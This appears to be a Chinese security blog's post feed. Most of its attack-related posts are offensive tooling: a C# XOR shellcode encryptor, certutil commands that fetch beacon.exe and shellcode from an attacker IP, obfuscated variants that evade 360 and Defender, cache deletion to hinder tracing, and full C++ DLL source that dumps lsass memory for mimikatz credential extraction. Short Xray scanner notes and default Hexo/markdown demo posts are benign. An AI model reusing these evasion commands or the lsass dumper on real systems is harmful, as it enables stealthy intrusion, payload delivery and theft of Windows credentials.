<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 原始shellcode</span></span><br><span class="line">        <span class="built_in">byte</span>[] shellcode = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">928</span>] &#123;&#125;;</span><br><span class="line">            </span><br><span class="line">        <span class="comment">// 加密密钥</span></span><br><span class="line">        <span class="built_in">byte</span>[] key = Encoding.UTF8.GetBytes(<span class="string">&quot;henry666&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加密shellcode</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; shellcode.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            shellcode[i] ^= key[i % key.Length];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印加密后的shellcode</span></span><br><span class="line">        Console.Write(<span class="string">&quot;byte[] shellcode = new byte[&#123;0&#125;] &#123;&#123;&quot;</span>, shellcode.Length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; shellcode.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.Write(<span class="string">&quot;0x&#123;0&#125;&quot;</span>, shellcode[i].ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">            <span class="keyword">if</span> (i != shellcode.Length - <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.Write(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Console.Write(<span class="string">&quot;&#125;;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待用户按下回车键</span></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;\n\nPress Enter to exit...&quot;</span>);</span><br><span class="line">        Console.ReadLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-jsp马研究"><a href="#2-jsp马研究" class="headerlink" title="2.jsp马研究"></a>2.jsp马研究</h2><p>webshell终端执行<code>tasklist</code>命令没有出现报毒</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711120654971.png" alt="image-20230711120654971"></p>
<p>执行whoami也没有报毒，为啥asp的马会报毒呢？会不会是冰鞋</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711120828955.png" alt="image-20230711120828955">	</p>
<p>运行白+黑时被杀软查杀了，查看进程链可以得知，cmd进程是起在javaw.exe下</p>
<blockquote>
<p><code>javaw.exe</code> 提供了一个运行环境，用于运行解析和执行 JSP 文件的 Servlet 容器</p>
</blockquote>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711162006664.png" alt="image-20230711162006664">			</p>
<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711161922059.png" alt="image-20230711161922059"></p>
<h2 id="3-php马"><a href="#3-php马" class="headerlink" title="3.php马"></a>3.php马</h2><p>​			</p>
<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>​	</p>
<p>​	</p>
<p>​			</p>
<p>​		</p>
<p>​	</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/certutil%E8%BF%87360/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>certutil.exe</code>是Windows操作系统中的一个命令行程序，主要用于处理和管理证书。这个工具可以用于执行各种与证书有关的任务，包括：</p>
<ol>
<li><strong>查看证书详情</strong>：您可以使用<code>certutil.exe</code>来查看已安装证书的详细信息，包括其签发者，有效期，公钥和私钥等。</li>
<li><strong>导入和导出证书</strong>：<code>certutil.exe</code>可以用来导入或导出证书，这对于备份或迁移证书非常有用。</li>
<li><strong>创建和删除证书</strong>：使用<code>certutil.exe</code>，您可以创建新的自签名证书，或者删除不再需要的证书。</li>
<li><strong>管理证书库</strong>：<code>certutil.exe</code>还允许您查看和管理您的证书库，这是存储所有证书的地方。</li>
</ol>
<h1 id="certutil常用命令"><a href="#certutil常用命令" class="headerlink" title="certutil常用命令"></a>certutil常用命令</h1><p>输入<code>certutil -?</code>查看此命令的更多操作，如下图所示：</p>
<p><img src="/certutil%E8%BF%87360/image-20230712215609377.png" alt="image-20230712215609377"></p>
<p>以下是certutil在渗透测试中常用到的一些命令参数：</p>
<ul>
<li><code>-dump</code>: 显示证书的内容。例如：<code>certutil -dump myfile.cer</code></li>
<li><code>-decode</code>: 解码 Base64 编码的文件。此选项可以用于解密或提取通过 Base64 编码的数据。例如：<code>certutil -decode inputfile outputfile</code></li>
<li><code>-encode</code>: 将文件编码为 Base64。这可以用于将二进制数据编码为文本。例如：<code>certutil -encode inputfile outputfile</code></li>
<li><code>-urlcache</code>: 显示或删除 URL 缓存的条目。在渗透测试中，这可以用于获取关于被访问的网页的信息。例如：<code>certutil -urlcache</code></li>
<li><code>-f</code>: 强制覆盖现有文件或下载。在与 <code>-urlcache</code> 结合使用时，<code>-f</code> 选项可以用于下载文件。例如：<code>certutil -urlcache -split -f http://example.com/myfile</code>，其中<code>-split</code>选项将文件拆分为小的块（如果需要在下载大文件时，这可能有助于提高性能</li>
</ul>
<p>certutil最常用到的命令还得是远程文件下载：<code>certutil -urlcache -split -f http:// 192.168.0.103/beacon.exe</code></p>
<p><img src="/certutil%E8%BF%87360/image-20230712220849062.png" alt="image-20230712220849062">	</p>
<p>但是下载文件后会产生缓存，可通过<code>certutil -urlcache *</code>进行查看</p>
<p><img src="/certutil%E8%BF%87360/image-20230712221250955.png" alt="image-20230712221250955"></p>
<p>避免蓝队查看缓存溯源，可以执行<code>certutil -urlcache * delete</code>来删除所有缓存</p>
<p><img src="/certutil%E8%BF%87360/image-20230712222627288.png" alt="image-20230712222627288"></p>
<p><img src="/certutil%E8%BF%87360/image-20230712222910681.png" alt="image-20230712222910681">	</p>
<p>或者在下载命令后面加个delete来删除当前下载文件的缓存：<code>certutil -urlcache -split -f http:// 192.168.0.103/beacon.exe delete</code></p>
<p><img src="/certutil%E8%BF%87360/image-20230712222958364.png" alt="image-20230712222958364"></p>
<p>使用 <code>certutil</code> 命令下载文件时，文件的存放位置取决于你在命令行中指定的路径。如果你没有指定路径，那么文件会被保存到你当前的工作目录，例如此处我是在<code>C:\Users\hasee</code>目录下执行的certutil命令</p>
<p><img src="/certutil%E8%BF%87360/image-20230712223214002.png" alt="image-20230712223214002">		</p>
<p>如果你想要将下载的文件保存到特定位置，你可以在文件名中填写完整路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.0.103:8000/beacon.exe C:\beacon.exe</span><br></pre></td></tr></table></figure>

<p><img src="/certutil%E8%BF%87360/image-20230712223710208.png" alt="image-20230712223710208"></p>
<h1 id="绕过360实战"><a href="#绕过360实战" class="headerlink" title="绕过360实战"></a>绕过360实战</h1><p>在360核晶模式环境下，运行certutil命令远程下载文件，不出所料，被拦截掉了</p>
<p><img src="/certutil%E8%BF%87360/image-20230713201900899.png" alt="image-20230713201900899"></p>
<p>以下命令利用Windows命令行解析器对特殊字符的处理规则进行混淆, 但还是会被核晶查杀</p>
<ul>
<li>分号(<code>;</code>)和逗号(<code>,</code>)会被cmd命令忽略，</li>
<li><code>@</code> 符号在CMD中用于关闭命令回显，意味着运行 <code>@certutil</code> 不会在命令行中显示任何输出</li>
<li>在<code>-urlcache</code>参数插入双引号(<code>&quot;&quot;</code>)同样也会被解析器忽略</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;,,@certutil  -u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot;&quot; -split  -f http://192.168.0.103:8000/shellcode_hex.txt</span><br></pre></td></tr></table></figure>

<p><img src="/certutil%E8%BF%87360/image-20230713204717895.png" alt="image-20230713204717895"></p>
<p>看了先知社区师傅的一篇文章：<a href="https://xz.aliyun.com/t/12503%EF%BC%8C%E5%9C%A8%E5%91%BD%E4%BB%A4%E5%90%8E%E9%9D%A2%E5%8A%A0%E4%B8%AA%60-deletePolicyServer%60%E5%8F%82%E6%95%B0">https://xz.aliyun.com/t/12503，在命令后面加个`-deletePolicyServer`参数</a>,  其作用是命令执行后会生成对应文件的缓存文件，但是这种方法失效了，依然会被360拦截</p>
<blockquote>
<p>还有其他类似参数：<code>-DeleteHelloContainer</code>、<code>-deleteEnrollmentServer</code>、<code>-deleteEccCurve</code></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;,@certutil  -u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot;&quot; -split  -f http://192.168.0.103:8000/shellcode_hex.txt -deletePolicyServer</span><br></pre></td></tr></table></figure>

<p><img src="/certutil%E8%BF%87360/image-20230713213757568.png" alt="image-20230713213757568"></p>
<p>​	</p>
<p>尝试将certutil文件拷贝出来执行，依旧被拦截，个人推测360是通过校验hash方法来判断你执行的可执行程序是否是certutil</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy C:\Windows\system32\certutil.exe cert.exe</span><br><span class="line"></span><br><span class="line">cert.exe -u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot;&quot; -split  -f http://192.168.0.103:8000/shellcode_hex.txt -deletePolicyServer</span><br></pre></td></tr></table></figure>

<p><img src="/certutil%E8%BF%87360/image-20230713213912937.png" alt="image-20230713213912937"></p>
<p>​	</p>
<p>将certutil.exe拖入<code>Resource Hacker</code>中，删除其版本和图标信息</p>
<p><img src="/certutil%E8%BF%87360/image-20230713213426191.png" alt="image-20230713213426191"></p>
<p>修改后的certutil并不需要做命令混淆，直接执行即可：<code>cert.exe -urlcache -split -f http://192.168.0.103:8000/shellcode_hex.txt</code>，没有被拦截，但是这种情况在实战中并没有太大的用处</p>
<p><img src="/certutil%E8%BF%87360/image-20230713214110405.png" alt="image-20230713214110405"></p>
<h1 id="绕Defender"><a href="#绕Defender" class="headerlink" title="绕Defender"></a>绕Defender</h1><p>WindowsDefender绕过比较简单，使用<code>“</code>和<code>^</code>符号做下命令混淆就能bypass, 如下两个都是bypass成功的示例代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cer^tu^til  -url&quot;&quot;&quot;&quot;cach&quot;&quot;&quot;&quot;e -sp&quot;&quot;lit  -f http://192.168.0.103:8000/shellcode_hex.txt</span><br><span class="line">certutil  -url&quot;&quot;&quot;&quot;cach&quot;&quot;&quot;&quot;e -sp&quot;&quot;lit  -f http://192.168.0.103:8000/shellcode_hex.txt</span><br></pre></td></tr></table></figure>

<p><img src="/certutil%E8%BF%87360/image-20230713215011940.png" alt="image-20230713215011940"></p>
<p>​					</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a href="https://xz.aliyun.com/t/12503">https://xz.aliyun.com/t/12503</a></li>
<li><a href="https://www.freebuf.com/articles/endpoint/334548.html">https://www.freebuf.com/articles/endpoint/334548.html</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/07/10/Xray/</url>
    <content><![CDATA[<p><strong>Xray</strong></p>
<p>1.使用xray进行服务扫描</p>
<p>#快速检测单个目标</p>
<p> .\xray_darwin_amd64.exe servicescan –target 127.0.0.1:8009</p>
<p>#批量检查1.txt中的目标，一行一个目标带端口</p>
<p> .\xray_darwin_amd64.exe servicescan –target-file 1.txt </p>
<p>其中，1.txt的格式为一行一个service，如</p>
<p>1.1.1.1:80</p>
<p>2.2.2.2:7777</p>
<p>若需要输出到html报告中则在后面加上 –html-output service.html,</p>
<p> .\xray_darwin_amd64.exe servicescan –target-file 1.file –html-output 1.html</p>
<p>批量扫url的命令</p>
<p>\xray_windows_amd64.exe webscan –url-file 2.txt –html-output 2.html</p>
]]></content>
  </entry>
  <entry>
    <title>hello,my first blog</title>
    <url>/2023/04/19/hello-my-first-blog/</url>
    <content><![CDATA[<h1 id="博客操作流程"><a href="#博客操作流程" class="headerlink" title="博客操作流程"></a>博客操作流程</h1><p>首先在博客根目录下右键打开git bash，安装一个扩展npm i hexo-deployer-git。</p>
<p>然后输入hexo new post “我的第一篇博客”，新建一篇文章。</p>
<p>然后打开D:\Hexo\source_posts的目录，可以发现下面多了一个文件夹和一个.md文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。<br>你可以会直接在vscode里面编写markdown文件，可以实时预览，也可以用用其他编辑md文件的软件的工具编写。<br>编写完markdown文件后，根目录下输入hexo g生成静态网页，然后输入hexo s可以本地预览效果，最后输入hexo d上传到github上。这时打开你的github.io主页就能看到发布的文章啦。</p>
<p>到这儿基本第一部分就完成了，已经完整搭建起一个比较简陋的个人博客了，接下来我们就可以对我们的博客进行个性化定制了。<br>以下学习markdown的相关语法并测试</p>
<p>1.1 代码块<br>&#39;‘’shell<br>#VScode终端<br>hexl clean;hexo s<br>hexo clean;hexo g;hexo d<br>git add . &amp;&amp;git commit -m “npm publish” &amp;&amp; npm version patch<br>git push<br>&#39;‘’ </p>
<p>1.2 多级标题</p>
<h1 id="H1"><a href="#H1" class="headerlink" title="H1"></a>H1</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><h3 id="H3"><a href="#H3" class="headerlink" title="H3"></a>H3</h3><p>以此类推</p>
<p>1.3 文字样式<br><u>下划线演示</u></p>
<p><strong>字体加粗</strong></p>
<p><em>斜体</em></p>
<p><code>高亮</code></p>
<p><del>删除</del></p>
<p><font size =5>5号字 </font><br><font face="等线">等线</font><br><font color=blue>蓝</font></p>
<p>1.4引用</p>
<blockquote>
<p>JAVA<br>二级引用演示<br>MYSQL</p>
<blockquote>
<p>外键</p>
<p>事务</p>
<p><strong>行级锁</strong>（引用一样可以用格式）</p>
</blockquote>
<p>….</p>
</blockquote>
<h2 id="1-5-分割线"><a href="#1-5-分割线" class="headerlink" title="1.5 分割线"></a>1.5 分割线</h2><hr>
<p>1.6 无序列表</p>
<ul>
<li>java</li>
<li>python</li>
<li>。。。</li>
</ul>
<ul>
<li>java</li>
<li>python</li>
<li>。。。</li>
</ul>
<ul>
<li>java</li>
<li>python</li>
<li>。。。</li>
</ul>
<p>1.6.2 有序列表（注意.后面有空格）</p>
<p>1.<br>2.<br>3. </p>
<p>1.7 图片</p>
<h1 id="本地图片"><a href="#本地图片" class="headerlink" title="本地图片"></a>本地图片</h1><p>&lt;&#x2F;img src&#x3D;”C:\Users\陈楠\OneDrive\图片\本机照片” alt&#x3D;”1.jpg” style&#x3D;”zoom:50%;”&gt;<br><img src="/image.png" alt="hello-my-first-blog" title="1"></p>
<p><img src="/./img/1.jpg" alt="1.jpg"></p>
<p>1.8表格</p>
<table>
<thead>
<tr>
<th>项目编号</th>
<th>资金</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>100,000</td>
<td>无</td>
</tr>
<tr>
<td>2</td>
<td>200,000</td>
<td>重要</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/04/19/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/mimikatz%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通常来说，即使我们成功实现了mimikatz的静态免杀，其抓取hash的行为仍可能会被防病毒软件检测到虽然你可以通过修改mimikatz的源码来实现行为上的免杀，但这需要花费大量的时间。我建议针对具体功能的代码来实现免杀，例如，mimikatz的dump hash功能主要依赖于Windows API的Minidump函数。</p>
<h1 id="绕过360核晶"><a href="#绕过360核晶" class="headerlink" title="绕过360核晶"></a>绕过360核晶</h1><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p><strong>1.设置权限</strong></p>
<p>为了能够访问 lsass.exe 进程的内存，代码首先检查并提升程序的权限。这是通过 <code>CheckPrivilege()</code> 和 <code>EnableDebugPrivilege()</code> 函数完成的</p>
<p><strong>2.获取lsass进程的pid</strong></p>
<p> 代码使用 <code>GetLsassPID()</code> 函数获取 lsass.exe 进程的进程ID (PID)</p>
<p><strong>3.创建内存转储文件</strong></p>
<p>代码最主要的部分是 <code>Dump()</code> 函数，这个函数使用了 <code>MiniDumpW</code> 函数来创建 lsass.exe 进程的内存转储文件。</p>
<p><code>MiniDump</code>函数是<code>comsvcs.dll</code>库中的一个函数，通常被用于生成进程的堆栈跟踪信息，在Windows中，<code>MiniDump</code>可以生成一个包含线程和句柄信息以及可选内存信息的dump文件，函数的使用需传入一个包含进程ID和转储文件路径的字符串参数</p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment( lib, <span class="string">&quot;Dbghelp.lib&quot;</span> )</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// comsvcs.dll 中 MiniDumpW 函数的类型定义</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HRESULT</span><span class="params">(WINAPI* _MiniDumpW)</span><span class="params">(DWORD , DWORD , PWCHAR )</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否具有管理员权限</span></span><br><span class="line"><span class="function">BOOL <span class="title">CheckPrivilege</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL state;</span><br><span class="line">    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;</span><br><span class="line">    PSID AdministratorsGroup;</span><br><span class="line"></span><br><span class="line">    state = <span class="built_in">AllocateAndInitializeSid</span>(</span><br><span class="line">        &amp;NtAuthority,</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        SECURITY_BUILTIN_DOMAIN_RID,</span><br><span class="line">        DOMAIN_ALIAS_RID_ADMINS,</span><br><span class="line">        SECURITY_LOCAL_SYSTEM_RID, DOMAIN_GROUP_RID_ADMINS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        &amp;AdministratorsGroup);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (state)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">CheckTokenMembership</span>(<span class="literal">NULL</span>, AdministratorsGroup, &amp;state))</span><br><span class="line">        &#123;</span><br><span class="line">            state = FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">FreeSid</span>(AdministratorsGroup);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启用调试权限</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThis = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    <span class="built_in">OpenProcessToken</span>(hThis, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);</span><br><span class="line">    LUID luid;</span><br><span class="line">    <span class="built_in">LookupPrivilegeValue</span>(<span class="number">0</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;seDebugPrivilege&quot;</span>), &amp;luid);</span><br><span class="line">    TOKEN_PRIVILEGES priv;</span><br><span class="line">    priv.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    priv.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    priv.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    BOOL isEnabiled = <span class="built_in">AdjustTokenPrivileges</span>(hToken, <span class="literal">false</span>, &amp;priv, <span class="built_in">sizeof</span>(priv), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (isEnabiled) &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThis);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 lsass 进程的 PID</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetLsassPID</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD lsassPID = <span class="number">0</span>;</span><br><span class="line">    HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 processEntry = &#123;&#125;;</span><br><span class="line">    processEntry.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    LPCWSTR processName = <span class="string">L&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;processEntry)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (_wcsicmp(processName, <span class="string">L&quot;lsass.exe&quot;</span>) != <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Process32Next</span>(snapshot, &amp;processEntry);</span><br><span class="line">            processName = processEntry.szExeFile;</span><br><span class="line">            lsassPID = processEntry.th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lsassPID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查指定文件是否存在</span></span><br><span class="line"><span class="function">BOOL <span class="title">CheckFileExists</span><span class="params">(PWCHAR file)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WIN32_FIND_DATA FindFileData;</span><br><span class="line">    HANDLE hFind = <span class="built_in">FindFirstFileEx</span>(file, FindExInfoStandard, &amp;FindFileData, FindExSearchNameMatch, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hFind == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Dump</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WCHAR commandLine[MAX_PATH]; <span class="comment">//命令行参数</span></span><br><span class="line">    WCHAR DumpFile[] = <span class="string">L&quot;C:\\Windows\\Temp\\test.log&quot;</span>; <span class="comment">//转储文件的路径</span></span><br><span class="line">    _MiniDumpW MiniDumpW; <span class="comment">//MiniDumpW 函数的指针</span></span><br><span class="line">    DWORD lsassPID = <span class="number">0</span>;  <span class="comment">//存放lsass进程的PID</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否具有管理员权限</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CheckPrivilege</span>()) </span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启用调试权限</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">EnableDebugPrivilege</span>()) </span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取lsass进程的PID</span></span><br><span class="line">    lsassPID = <span class="built_in">GetLsassPID</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 MiniDumpW 函数的地址</span></span><br><span class="line">    MiniDumpW = (_MiniDumpW)<span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibrary</span>(<span class="string">L&quot;comsvcs.dll&quot;</span>), <span class="string">&quot;MiniDumpW&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 准备MiniDumpWh函数的参数,full是传递给MiniDumpW函数的参数之一，表示创建一个完整的内存转储</span></span><br><span class="line">    <span class="built_in">swprintf</span>(commandLine, <span class="number">512</span>, <span class="string">L&quot;%d %s full&quot;</span>, lsassPID, DumpFile);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 MiniDumpW 函数创建内存转储文件</span></span><br><span class="line">    <span class="built_in">MiniDumpW</span>(<span class="number">0</span>, <span class="number">0</span>, commandLine);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, </span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">Dump</span>();</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>将生成的dll文件配合rundll.exe执行：<code>rundll32 DumpHash.dll dllmain</code>（其实我更偏向使用白+黑来执行dll文件）</p>
<p>在此过程中360核晶并没有拦截，执行完毕后会在<code>Windows/temp</code>目录生成<code>test.log</code>（此文件就是lsass进程的dump文件）</p>
<blockquote>
<p>在Windows系统中，<code>rundll32.exe</code>是一个重要的系统工具，用于加载和执行动态链接库(DLL)中的函数</p>
</blockquote>
<p><img src="/mimikatz%E5%85%8D%E6%9D%80/image-20230716203413832.png" alt="image-20230716203413832"></p>
<p>​	</p>
<p>将test.log拖到本机使用mimikatz执行如下命令导出目标主机的密码：</p>
<ul>
<li><code>sekurlsa::minidump test.log</code>：mimikatz将只从指定的内存转储文件test.log中读取数据，而不再直接从LSASS进程中读取数据</li>
